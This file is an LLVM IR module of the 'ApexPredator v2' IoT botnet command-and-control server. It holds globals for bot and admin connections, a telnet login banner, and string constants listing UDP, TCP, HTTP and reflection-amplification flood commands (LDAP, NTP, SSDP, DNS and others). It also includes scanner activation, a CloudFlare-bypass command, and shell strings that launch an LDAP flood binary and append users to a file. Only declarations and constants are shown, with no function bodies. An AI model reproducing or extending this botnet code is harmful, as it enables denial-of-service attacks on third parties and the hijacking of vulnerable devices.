; ModuleID = 'host/ir_fla/Apex_Predator.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.clientdata_t = type { i32, [7 x i8], i8 }
%struct.telnetdata_t = type { i32, i32 }
%struct.account = type { [20 x i8], [20 x i8], [20 x i8] }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@clients = common global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = common global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.1 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.3 = private unnamed_addr constant [15 x i8] c"!* SCANNER ON\0A\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.5 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.7 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.219 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@managesConnected = internal global i32 0, align 4
@.str.8 = private unnamed_addr constant [64 x i8] c"%c]0; ApexPredator v2 | IoT Devices: %d | Apex Predators: %d %c\00", align 1
@.str.9 = private unnamed_addr constant [9 x i8] c"apex.txt\00", align 1
@.str.10 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.11 = private unnamed_addr constant [36 x i8] c"\1B[1;37m[\1B[0;36m%d.%d.%d.%d\1B[1;37m]\0A\00", align 1
@.str.12 = private unnamed_addr constant [11 x i8] c"server.log\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.14 = private unnamed_addr constant [36 x i8] c"\0A\1B[1;37m[\1B[0;36m%d.%d.%d.%d\1B[1;37m]\00", align 1
@.str.15 = private unnamed_addr constant [6 x i8] c"admin\00", align 1
@accounts = internal global [25 x %struct.account] zeroinitializer, align 16
@.str.16 = private unnamed_addr constant [9 x i8] c"%s %s %s\00", align 1
@.str.17 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.18 = private unnamed_addr constant [32 x i8] c"\1B[0;31mUsername\1B[1;37m: \1B[1;37m\00", align 1
@.str.20 = private unnamed_addr constant [32 x i8] c"\1B[0;31mPassword\1B[1;37m: \1B[1;37m\00", align 1
@.str.21 = private unnamed_addr constant [11 x i8] c"\1B[2J\1B[1;1H\00", align 1
@.str.22 = private unnamed_addr constant [23 x i8] c"Login Attempt Saved.\0D\0A\00", align 1
@.str.23 = private unnamed_addr constant [56 x i8] c"Please contact the owner if you run into this issue!!\0D\0A\00", align 1
@.str.24 = private unnamed_addr constant [15 x i8] c"\1B[1A\1B[2J\1B[1;1H\00", align 1
@.str.25 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.26 = private unnamed_addr constant [49 x i8] c"\1B[1;37m              Welome to the \1B[1;31mApex\0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [71 x i8] c"\1B[1;37m  A place where all the \1B[1;31mApex Predators\1B[1;37m hang out\0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [56 x i8] c"\1B[1;37m              Version 2 [\1B[1;31mcustom\1B[1;37m]\0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [28 x i8] c"\1B[1;31mApexPredator\1B[1;37m#\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"BOTS\00", align 1
@.str.31 = private unnamed_addr constant [5 x i8] c"bots\00", align 1
@.str.32 = private unnamed_addr constant [8 x i8] c"devices\00", align 1
@.str.33 = private unnamed_addr constant [8 x i8] c"DEVICES\00", align 1
@.str.34 = private unnamed_addr constant [141 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m.\1B[1;36mssh\1B[1;37m] - \1B[1;31m %d \0D\0A\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m.\1B[1;36musers\1B[1;37m] - \1B[1;31m %d \0D\0A\00", align 1
@.str.35 = private unnamed_addr constant [5 x i8] c"HELP\00", align 1
@.str.36 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@.str.37 = private unnamed_addr constant [5 x i8] c"Help\00", align 1
@.str.38 = private unnamed_addr constant [68 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]All Commands\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.39 = private unnamed_addr constant [84 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]---------------------------------------------------------\0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;31mClear Screen\1B[1;37m]         CLEAR\0D\0A\00", align 1
@.str.41 = private unnamed_addr constant [53 x i8] c"\1B[1;37m[\1B[1;32mLOGOUT\1B[1;37m]               LOGOUT\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;33mUsable Ports\1B[1;37m]         PORTS\0D\0A\00", align 1
@.str.43 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;34mRules\1B[1;37m]                RULES\0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;36mSpoofing Methods\1B[1;37m]     SPOOF\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [54 x i8] c"\1B[1;37m[\1B[1;31mSpecial Commands\1B[1;37m]     SPECIAL\0D\0A\00", align 1
@.str.46 = private unnamed_addr constant [53 x i8] c"\1B[1;37m[\1B[1;32mScanning Commands\1B[1;37m]    REAPER\0D\0A\00", align 1
@.str.47 = private unnamed_addr constant [53 x i8] c"\1B[1;37m[\1B[1;33mStressing Commands\1B[1;37m]   STRESS\0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [7 x i8] c"STRESS\00", align 1
@.str.49 = private unnamed_addr constant [7 x i8] c"stress\00", align 1
@.str.50 = private unnamed_addr constant [5 x i8] c"ddos\00", align 1
@.str.51 = private unnamed_addr constant [5 x i8] c"DDOS\00", align 1
@.str.52 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m] Method Listings\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.53 = private unnamed_addr constant [58 x i8] c"\1B[1;37m[\1B[1;31mLayer4 UDP\1B[1;37m]               L4UDP  \0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [58 x i8] c"\1B[1;37m[\1B[1;31mLayer4 TCP\1B[1;37m]               L4TCP  \0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [60 x i8] c"\1B[1;37m[\1B[1;31mLayer4 Spoofing\1B[1;37m]          L4SPOOF  \0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [55 x i8] c"\1B[1;37m[\1B[1;31mLayer7\1B[1;37m]                   L7  \0D\0A\00", align 1
@.str.57 = private unnamed_addr constant [6 x i8] c"L4UDP\00", align 1
@.str.58 = private unnamed_addr constant [6 x i8] c"l4udp\00", align 1
@.str.59 = private unnamed_addr constant [6 x i8] c"l4UDP\00", align 1
@.str.60 = private unnamed_addr constant [6 x i8] c"L4udp\00", align 1
@.str.61 = private unnamed_addr constant [76 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m] Layer 4 UDP Listing\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.62 = private unnamed_addr constant [114 x i8] c"\1B[1;37m[\1B[1;31mUDP Flood\1B[1;37m]    !* UDP  [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 0 1\0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [107 x i8] c"\1B[1;37m[\1B[1;31mSTD Flood\1B[1;37m]    !* STD  [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.64 = private unnamed_addr constant [107 x i8] c"\1B[1;37m[\1B[1;31mHOLD Flood\1B[1;37m]   !* HOLD [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.65 = private unnamed_addr constant [107 x i8] c"\1B[1;37m[\1B[1;31mJUNK Flood\1B[1;37m]   !* JUNK [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.66 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;31mCNC Flood\1B[1;37m]    !* CNC  [\1B[1;31mIP\1B[1;37m] [\1B[1;31mADMIN PORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"L4TCP\00", align 1
@.str.68 = private unnamed_addr constant [6 x i8] c"l4tcp\00", align 1
@.str.69 = private unnamed_addr constant [6 x i8] c"l4TCP\00", align 1
@.str.70 = private unnamed_addr constant [6 x i8] c"L4tcp\00", align 1
@.str.71 = private unnamed_addr constant [76 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m] Layer 4 TCP Listing\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.72 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-ALL Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 ALL 0 1\0D\0A\00", align 1
@.str.73 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-SYN Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 SYN 0 1\0D\0A\00", align 1
@.str.74 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-FIN Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 FIN 0 1\0D\0A\00", align 1
@.str.75 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-RST Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 RST 0 1\0D\0A\00", align 1
@.str.76 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-PSH Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 PSH 0 1\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-CRI Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 CRI 0 1\0D\0A\00", align 1
@.str.78 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-PRO Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 PRO 0 1\0D\0A\00", align 1
@.str.79 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-ACK Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 ACK 0 1\0D\0A\00", align 1
@.str.80 = private unnamed_addr constant [120 x i8] c"\1B[1;37m[\1B[1;31mTCP-XMAS Flood\1B[1;37m] !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 XMAS 0 1\0D\0A\00", align 1
@.str.81 = private unnamed_addr constant [3 x i8] c"L7\00", align 1
@.str.82 = private unnamed_addr constant [3 x i8] c"l7\00", align 1
@.str.83 = private unnamed_addr constant [7 x i8] c"layer7\00", align 1
@.str.84 = private unnamed_addr constant [7 x i8] c"Layer7\00", align 1
@.str.85 = private unnamed_addr constant [7 x i8] c"LAYER7\00", align 1
@.str.86 = private unnamed_addr constant [79 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m] Layer 7 Method Listing\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.87 = private unnamed_addr constant [88 x i8] c"\1B[1;37m[\1B[1;31mHTTP Flood\1B[1;37m]   !* HTTP  [\1B[1;31mURL\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.88 = private unnamed_addr constant [88 x i8] c"\1B[1;37m[\1B[1;31mWGET Flood\1B[1;37m]   !* WGET  [\1B[1;31mURL\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.89 = private unnamed_addr constant [8 x i8] c"L4SPOOF\00", align 1
@.str.90 = private unnamed_addr constant [8 x i8] c"l4spoof\00", align 1
@.str.91 = private unnamed_addr constant [8 x i8] c"l4SPOOF\00", align 1
@.str.92 = private unnamed_addr constant [73 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]Spoofing Commands\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.93 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;31mLDAP Flood\1B[1;37m]     !* LDAP     [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.94 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;32mNTP Flood\1B[1;37m]      !* NTP      [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.95 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;33mSSDP Flood\1B[1;37m]     !* SSDP     [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.96 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;34mDNS Flood\1B[1;37m]      !* DNS      [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.97 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;35mREAPER Flood\1B[1;37m]   !* REAPER   [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.98 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;36mMSSQL Flood\1B[1;37m]    !* MSSQL    [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.99 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;31mPORTMAP Flood\1B[1;37m]  !* PORTMAP  [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.100 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;32mTS3 Flood\1B[1;37m]      !* TS3      [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.101 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;33mSENTINEL Flood\1B[1;37m] !* SENTINEL [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.102 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]Reflection Listing\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.103 = private unnamed_addr constant [41 x i8] c"\1B[1;37m[\1B[1;31mLDAP\1B[1;37m]:\1B[1;31m 0 \0D\0A\00", align 1
@.str.104 = private unnamed_addr constant [39 x i8] c"\1B[1;37m[\1B[1;32mNTP\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.105 = private unnamed_addr constant [40 x i8] c"\1B[1;37m[\1B[1;33mSSDP\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.106 = private unnamed_addr constant [39 x i8] c"\1B[1;37m[\1B[1;34mDNS\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.107 = private unnamed_addr constant [42 x i8] c"\1B[1;37m[\1B[1;35mREAPER\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.108 = private unnamed_addr constant [41 x i8] c"\1B[1;37m[\1B[1;36mMSSQL\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.109 = private unnamed_addr constant [43 x i8] c"\1B[1;37m[\1B[1;31mPORTMAP\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.110 = private unnamed_addr constant [39 x i8] c"\1B[1;37m[\1B[1;32mTS3\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.111 = private unnamed_addr constant [44 x i8] c"\1B[1;37m[\1B[1;33mSENTINEL\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.112 = private unnamed_addr constant [8 x i8] c"SPECIAL\00", align 1
@.str.113 = private unnamed_addr constant [6 x i8] c"ADMIN\00", align 1
@.str.114 = private unnamed_addr constant [6 x i8] c"Admin\00", align 1
@.str.115 = private unnamed_addr constant [8 x i8] c"special\00", align 1
@.str.116 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]Special Commands\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.117 = private unnamed_addr constant [95 x i8] c"\1B[1;37m[\1B[1;31mAdds User\1B[1;37m]         root_add  [\1B[1;31mUSER\1B[1;37m] [\1B[1;31mPASS\1B[1;37m]\0D\0A\00", align 1
@.str.118 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;32mIP Geolocation\1B[1;37m]    root_geo  [\1B[1;31mIP\1B[1;37m]\0D\0A\00", align 1
@.str.119 = private unnamed_addr constant [73 x i8] c"\1B[1;37m[\1B[1;33mSubDomain Scanner\1B[1;37m] root_sub  [\1B[1;31mURL\1B[1;37m]\0D\0A\00", align 1
@.str.120 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;34mPort Scanner\1B[1;37m]      root_scan [\1B[1;31mIP\1B[1;37m]\0D\0A\00", align 1
@.str.121 = private unnamed_addr constant [73 x i8] c"\1B[1;37m[\1B[1;35mCloudFlare Bypass\1B[1;37m] root_cf   [\1B[1;31mURL\1B[1;37m]\0D\0A\00", align 1
@.str.122 = private unnamed_addr constant [7 x i8] c"LOGOUT\00", align 1
@.str.123 = private unnamed_addr constant [77 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] User:[\1B[0;36m%s\1B[1;37m] Has Logged Out!\0A\00", align 1
@.str.124 = private unnamed_addr constant [11 x i8] c"LOGOUT.log\00", align 1
@.str.125 = private unnamed_addr constant [7 x i8] c"logout\00", align 1
@.str.126 = private unnamed_addr constant [5 x i8] c"MOVE\00", align 1
@.str.127 = private unnamed_addr constant [5 x i8] c"move\00", align 1
@.str.128 = private unnamed_addr constant [95 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] User:[\1B[0;36m%s\1B[1;37m] Has Attempted To Shell Your Bots!\0A\00", align 1
@.str.129 = private unnamed_addr constant [10 x i8] c"SHELL.log\00", align 1
@.str.130 = private unnamed_addr constant [94 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] User: \1B[0;36m%s\1B[1;37m Has Attempted To Shell Your Bots!\0A\00", align 1
@.str.131 = private unnamed_addr constant [8 x i8] c"!* STOP\00", align 1
@.str.132 = private unnamed_addr constant [12 x i8] c"!* KILLATTK\00", align 1
@.str.133 = private unnamed_addr constant [25 x i8] c"[Reaper] Attack Stopped!\00", align 1
@.str.134 = private unnamed_addr constant [7 x i8] c"!* UDP\00", align 1
@.str.135 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mUDP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.136 = private unnamed_addr constant [7 x i8] c"!* STD\00", align 1
@.str.137 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mSTD \1B[1;37mFlood!\0D\0A\00", align 1
@.str.138 = private unnamed_addr constant [8 x i8] c"resolve\00", align 1
@.str.139 = private unnamed_addr constant [8 x i8] c"RESOLVE\00", align 1
@.str.140 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.141 = private unnamed_addr constant [66 x i8] c"Resolved \1B[1;37m[\1B[0;31m%s\1B[1;37m] to \1B[1;37m[\1B[0;31m%s\1B[1;37m]\0D\0A\00", align 1
@.str.142 = private unnamed_addr constant [60 x i8] c"\1B[1;37mYou Dont Have Permission To Use This\1B[0;31m!\1B[1;37\0D\0A\00", align 1
@.str.143 = private unnamed_addr constant [8 x i8] c"adduser\00", align 1
@.str.144 = private unnamed_addr constant [8 x i8] c"ADDUSER\00", align 1
@.str.145 = private unnamed_addr constant [22 x i8] c"echo '%s' >> apex.txt\00", align 1
@.str.146 = private unnamed_addr constant [90 x i8] c"\1B[1;37m[\1B[1;31mApex\1B[1;37m] \1B[1;37mUser:[\1B[0;36m%s\1B[1;37m] Added User:[\1B[0;36m%s\1B[1;37m]\0A\00", align 1
@.str.147 = private unnamed_addr constant [91 x i8] c"\1B[1;37m[\1B[1;31mApex\1B[1;37m] \1B[1;37mUser:[\1B[0;36m%s\1B[1;37m] Added User:[\1B[0;36m%s\1B[1;37m]\0D\0A\00", align 1
@.str.148 = private unnamed_addr constant [7 x i8] c"!* CNC\00", align 1
@.str.149 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mCNC \1B[1;37mFlood!\0D\0A\00", align 1
@.str.150 = private unnamed_addr constant [8 x i8] c"!* HTTP\00", align 1
@.str.151 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mHTTP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.152 = private unnamed_addr constant [8 x i8] c"!* JUNK\00", align 1
@.str.153 = private unnamed_addr constant [8 x i8] c"!* HOLD\00", align 1
@.str.154 = private unnamed_addr constant [7 x i8] c"!* TCP\00", align 1
@.str.155 = private unnamed_addr constant [57 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Loading sockets...\0D\0A\00", align 1
@.str.156 = private unnamed_addr constant [8 x i8] c"!* WGET\00", align 1
@.str.157 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mWGET \1B[1;37mFlood!\0D\0A\00", align 1
@.str.158 = private unnamed_addr constant [5 x i8] c"XMAS\00", align 1
@.str.159 = private unnamed_addr constant [124 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mT\1B[1;32mC\1B[1;33mP\1B[1;34m-\1B[1;35mX\1B[1;36mM\1B[1;31mA\1B[1;32mS \1B[1;37mFlood\0D\0A\00", align 1
@.str.160 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.161 = private unnamed_addr constant [103 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mTCP \1B[1;37mFlood using \1B[1;31mALL \1B[1;37mMethods!\0D\0A\00", align 1
@.str.162 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.163 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-SYN \1B[1;37mFlood\0D\0A\00", align 1
@.str.164 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.165 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-FIN \1B[1;37mFlood\0D\0A\00", align 1
@.str.166 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.167 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-RST \1B[1;37mFlood\0D\0A\00", align 1
@.str.168 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.169 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-ACK \1B[1;37mFlood\0D\0A\00", align 1
@.str.170 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.171 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-PSH \1B[1;37mFlood\0D\0A\00", align 1
@.str.172 = private unnamed_addr constant [4 x i8] c"PRO\00", align 1
@.str.173 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-PRO \1B[1;37mFlood\0D\0A\00", align 1
@.str.174 = private unnamed_addr constant [4 x i8] c"CRI\00", align 1
@.str.175 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-CRI \1B[1;37mFlood\0D\0A\00", align 1
@.str.176 = private unnamed_addr constant [5 x i8] c"ldap\00", align 1
@.str.177 = private unnamed_addr constant [5 x i8] c"LDAP\00", align 1
@.str.178 = private unnamed_addr constant [30 x i8] c"./ldap %s %s ldap.txt 2 -1 %s\00", align 1
@.str.179 = private unnamed_addr constant [70 x i8] c"[ApexPredator] Sending LDAP Attack to %s On Port %s For %s Seconds! \0A\00", align 1
@.str.180 = private unnamed_addr constant [10 x i8] c"root_ssdp\00", align 1
@.str.181 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mSSDP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.182 = private unnamed_addr constant [9 x i8] c"root_ntp\00", align 1
@.str.183 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mNTP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.184 = private unnamed_addr constant [14 x i8] c"root_sentinel\00", align 1
@.str.185 = private unnamed_addr constant [76 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mSENTINEL \1B[1;37mFlood!\0D\0A\00", align 1
@.str.186 = private unnamed_addr constant [9 x i8] c"root_dns\00", align 1
@.str.187 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mDNS \1B[1;37mFlood!\0D\0A\00", align 1
@.str.188 = private unnamed_addr constant [12 x i8] c"root_reaper\00", align 1
@.str.189 = private unnamed_addr constant [80 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mApexPredator \1B[1;37mFlood!\0D\0A\00", align 1
@.str.190 = private unnamed_addr constant [11 x i8] c"root_mssql\00", align 1
@.str.191 = private unnamed_addr constant [73 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mMSSQL \1B[1;37mFlood!\0D\0A\00", align 1
@.str.192 = private unnamed_addr constant [13 x i8] c"root_portmap\00", align 1
@.str.193 = private unnamed_addr constant [75 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mPORTMAP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.194 = private unnamed_addr constant [9 x i8] c"root_ts3\00", align 1
@.str.195 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mTS3 \1B[1;37mFlood!\0D\0A\00", align 1
@.str.196 = private unnamed_addr constant [14 x i8] c"!* SCANNER ON\00", align 1
